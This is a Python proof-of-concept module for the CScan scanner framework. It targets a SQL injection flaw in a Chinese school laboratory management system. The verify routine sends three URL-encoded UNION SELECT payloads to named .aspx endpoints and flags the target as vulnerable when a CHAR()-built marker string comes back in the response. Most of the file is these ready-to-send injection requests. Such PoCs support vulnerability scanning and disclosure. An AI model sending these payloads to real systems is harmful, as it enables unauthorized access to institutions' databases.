# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'SunData_0001' # 平台漏洞编号，留空
    name = '三唐实验室综合信息管理系统SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-07'  # 漏洞公布时间
    desc = '''
        湖南三唐信息科技有限公司某学校在用的通用型实验管理系统SQL注入漏洞。
        /OpenTimsUI/AddOpenBook/AddXM_ExpOpCodeidlabtime.aspx?TaskID=-1
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '三唐实验室综合信息管理系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'aa25dfda-1007-441c-8574-15cdf4c7c7af'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0105992
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0105286
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0105283
            hh = hackhttp.hackhttp()
            payload = '/OpenTimsUI/AddOpenBook/AddXM_ExpOpCodeidlabtime.aspx?TaskID=-1%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%31%32%29%2b%43%48%41%52%28%31%32%30%29%2b%43%48%41%52%28%31%30%36%29%2b%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%39%38%29%2b%43%48%41%52%28%31%31%32%29%2b%43%48%41%52%28%31%32%30%29%2b%43%48%41%52%28%31%31%33%29%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d&type=stu'
            url = self.target + payload
            code, head, res, errcode, _ = hh.http(url)
            if code ==500 and 'qpxjqqbpxq' in res :
                #security_hole(arg+'/OpenTimsUI/AddOpenBook/AddXM_ExpOpCodeidlabtime.aspx?TaskID=1'+'  :found sql injection ')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
                
            payload = '/OpenTimsUI/STUMODEL/StuBookExpCell.aspx?codeID=-1%27%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28120%29%2bCHAR%28106%29%2bCHAR%28113%29%2bCHAR%28113%29%2bCHAR%2898%29%2bCHAR%28112%29%2bCHAR%28120%29%2bCHAR%28113%29%2bCHAR%2869%29%2bCHAR%28122%29%2bCHAR%2897%29%2bCHAR%28109%29%2bCHAR%28105%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%2898%29%2bCHAR%28106%29%2bCHAR%28113%29%2CNULL--'
            url = self.target + payload
            code, head, res, errcode, _ = hh.http(url)
            if code ==500 and 'qpxjqqbpxqEzamiqxbjq' in res :
                #security_hole(arg+'/OpenTimsUI/STUMODEL/StuBookExpCell.aspx?codeID=1'+'  :found sql injection ')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
                
            payload = '/OpenTimsUI/AddOpenBook/AddXM_ExpOpCodeidlabtime.aspx?TaskID=-1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2bCHAR%28112%29%2bCHAR%2898%29%2bCHAR%28107%29%2bCHAR%28113%29%2bCHAR%2868%29%2bCHAR%2872%29%2bCHAR%28114%29%2bCHAR%2884%29%2bCHAR%2870%29%2bCHAR%2869%29%2bCHAR%2872%29%2bCHAR%2897%29%2bCHAR%2867%29%2bCHAR%28101%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%28107%29%2bCHAR%28120%29%2bCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20%26type%3Dstu'
            url = self.target + payload
            code, head, res, errcode, _ = hh.http(url)
            if code ==500 and 'qpbkqDHrTFEHaCeqxkxq' in res :
                #security_hole(arg+'/OpenTimsUI/AddOpenBook/AddXM_ExpOpCodeidlabtime.aspx?TaskID=1'+'  :found sql injection ')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
